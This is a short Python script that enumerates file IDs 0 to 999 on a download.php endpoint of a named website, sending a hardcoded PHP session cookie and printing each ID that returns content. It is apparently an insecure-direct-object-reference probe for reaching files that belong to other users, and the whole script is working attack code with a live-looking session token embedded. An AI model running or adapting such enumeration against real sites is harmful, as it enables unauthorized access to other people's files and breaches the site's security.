import requests

ids = range(0, 1000)

for i in ids:
    url = "https://safeweb.aec.cz/download.php?file_id=" + str(i)
    r = requests.get(url , cookies = {"PHPSESSID": "sgfrcjtssktob187somvgejil6"})
    if (r.text != ""):
        print(i)
